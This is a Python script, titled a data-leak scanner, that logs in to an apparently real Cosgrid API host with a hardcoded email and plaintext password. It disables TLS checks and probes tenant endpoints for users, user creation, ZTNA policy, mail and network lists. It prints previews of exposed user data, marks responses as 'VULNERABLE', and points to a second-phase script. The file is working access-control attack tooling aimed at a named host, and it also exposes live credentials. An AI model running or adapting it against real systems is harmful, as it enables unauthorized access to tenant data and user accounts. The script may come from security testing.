#!/usr/bin/env python3
# COSGRID PHASE 1: ULTIMATE SCANNER [file:147]
import requests
import json
import urllib3
urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════════════════════════════
# 🔧 CONFIGURATION - EDIT HERE ONLY!
# ═══════════════════════════════════════════════════════════════════════════════
base_url = "https://poc.cosgridnetworks.in:444/api/v1"  # 👈 CHANGE TARGET HERE
username = "cosgrid@gmail.com"                           # 👈 CHANGE USERNAME
password = "Mano@321"                                    # 👈 CHANGE PASSWORD
tenant_id = 12                                           # 👈 CHANGE TENANT_ID

# 📝 ADD NEW ENDPOINTS HERE 👇
endpoints = [
    # Format: ("DISPLAY_NAME", "API_PATH", "METHOD(GET/POST)", "TENANT_PARAM")
    ("teams", "tenant/data/teams/", "GET", True),
    ("userlist2*", "tenant/data/userlist2/", "POST", True), 
    ("users", "tenant/data/users/", "GET", True),
    ("useradd*", "tenant/data/useradd/", "POST", True),
    ("ztna", "tenant/config/ztna-policy/", "GET", True),
    ("ticket", "tenant/support/ticket-integration/", "GET", True),
    ("mail", "tenant/data/cosgrid-com-mail/", "GET", True),
    ("network", "tenant/network/networklist/", "GET", True),
    # ═══ ADD NEW 👇 ═══
    # ("new_endpoint", "tenant/data/new/", "GET", True),
    # ("post_test*", "api/special/", "POST", False),  # No tenant_id
]
# ═══════════════════════════════════════════════════════════════════════════════

s = requests.Session()
resp = s.post(f"{base_url}/auth/login/", json={"username": username, "password": password}, verify=False)
s.headers["Authorization"] = f"Bearer {resp.json()['token']}"

print("🔍 COSGRID DATA LEAK SCANNER")
print("═" * 110)
print(f"{'Endpoint':<20} {'Status':<6} {'Size':<8} {'DATA PREVIEW':<40} {'Status'}")
print("─" * 110)

vulns = []
for name, path, method, use_tenant in endpoints:
    params = {"tenant_id": tenant_id} if use_tenant else {}
    
    if method == "POST":
        resp = s.post(f"{base_url}/{path}", json={}, params=params, verify=False)
    else:
        resp = s.get(f"{base_url}/{path}", params=params, verify=False)
    
    size = len(resp.text)
    preview = ""
    
    # 👇 DATA PREVIEW LOGIC (CURL STYLE)
    try:
        data = resp.json()
        if isinstance(data, dict) and "all_users" in data:
            users = data["all_users"][:3]
            preview = f"[{len(data['all_users'])} users] " + ", ".join([u.get("username", "?") for u in users])
        elif isinstance(data, list) and len(data):
            preview = f"[{len(data)} items] {json.dumps(data[0])[:35]}..."
        else:
            preview = str(data)[:40] + "..."
    except:
        preview = resp.text[:40] + "..."
    
    vuln = resp.status_code == 200 and size > 100
    status = "🚨 VULNERABLE" if vuln else "✅ Not Vulnerable"
    
    print(f"{name:<20} {resp.status_code:<6} {size:<8}b {preview:<40} {status}")
    
    if vuln:
        vulns.append((name, path.replace("/", "_")))

print(f"\n🎯 {len(vulns)} VULNERABILITIES!")
if vulns:
    print("\n📤 VULN SUMMARY:")
    for i, (name, safe_path) in enumerate(vulns, 1):
        print(f"  {i}. {name:<18} → phase2.py {safe_path}")
    print()
